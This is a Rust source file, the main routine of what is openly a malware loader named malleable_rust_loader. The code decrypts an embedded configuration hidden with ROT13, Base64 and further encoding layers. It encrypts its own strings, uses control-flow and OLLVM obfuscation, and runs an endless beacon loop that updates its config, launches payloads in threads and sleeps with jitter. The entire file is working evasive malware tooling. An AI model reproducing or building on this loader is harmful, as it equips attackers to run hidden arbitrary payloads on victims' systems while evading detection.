use malleable_rust_loader::config::Config;
//use malleable_rust_loader::link::LinkFetch;
use std::thread;

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use malleable_rust_loader::dataoperation::un_apply_all_dataoperations;
use malleable_rust_loader::dataoperation::DataOperation;
use malleable_rust_loader::payload::Payload;
use malleable_rust_loader::payload_util::print_running_thread;

use log::debug;
use log::error;
use log::info;
extern crate env_logger;
use cryptify;

// ------ STANDARD compilation
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const INITIAL_LOADER : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.aead"));
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.aead.dataop.rot13b64"));

// ------ OLLVM compilation from docker
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const INITIAL_LOADER : &[u8] = include_bytes!("/projects/config/initial.json.aead");
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!("/projects/config/initial.json.aead.dataop.rot13b64");

fn main() {
    #[cfg(feature = "logdebug")]
    env_logger::init();
    cryptify::flow_stmt!();
    let session_id: String = uuid::Uuid::new_v4().to_string();
    info!("{}{}", lc!("[+] session_id: "),session_id);

    let loader_conf_encrypted = INITIAL_LOADER.to_vec();
    let data_op_encrypted = INITIAL_LOADER_DATAOPE.to_vec();
    let ope_for_data_op: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64];
    let decrypted_dataop = un_apply_all_dataoperations(ope_for_data_op, data_op_encrypted).unwrap();
    let dataoperation: Vec<DataOperation> =
        serde_json::from_slice(decrypted_dataop.as_slice()).unwrap();
    debug!("{}{:?}", lc!("[+] dataoperation: "), dataoperation);
    info!("{}", lc!("[+] DECRYPT initial config"));
    let decrypted_conf = un_apply_all_dataoperations(dataoperation, loader_conf_encrypted).unwrap();
    info!("{}", lc!("[+] DECRYPTED!"));
    let mut config: Config = serde_json::from_slice(decrypted_conf.as_slice()).unwrap();
    info!("{}", lc!("[+] VERIFY initial config"));
    debug!("{:?}", &config);
    config.verify_newconfig_signature(&config).unwrap();
    info!("{}{}", lc!("[+] VERIFIED!"), "\n");

    let mut running_thread: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
    let mut loop_nb = 1;
    loop {
        info!(
            "{}{}{}",
            lc!("[+] BEGIN LOOP "),
            loop_nb,
            lc!(" --------------------------------------------------------")
        );
        info!("{}{:?}", lc!("[+] Active LOADER: "), config);

        info!("{}", lc!("[+] DEFUSE UPDATE config"));
        if config.stop_defuse(&config.defuse_update) {
            error!("{}", lc!("[!] DEFUSE STOP update config"));
        } else {
            info!("{}", lc!("[+] UPDATE config"));
            let mut bagarre : Vec<Payload> = vec![];
            for t in &running_thread {
                bagarre.push(t.1.clone());
            };

            config = config.update_config(&session_id,&bagarre);
            info!("{}", lc!("[+] DEFUSE payload exec"));
            if config.stop_defuse(&config.defuse_payload) {
                error!("{}", lc!("[!] DEFUSE STOP the payload exec"));
            } else {
                info!("{}", lc!("[+] PAYLOADS exec"));
                config.exec_payloads(&mut running_thread);
            }
        }

        print_running_thread(&mut running_thread);
        //TODO wait all thread to finish -> new option
        config.sleep_and_jitt();
        info!(
            "{}{}{}{}",
            lc!("[+] END LOOP "),
            loop_nb,
            lc!(" ----------------------------------------------------------"),
            "\n"
        );
        loop_nb = loop_nb + 1;
    }
}


/* running_thread: &mut Vec<(thread::JoinHandle<()>, Payload)>) */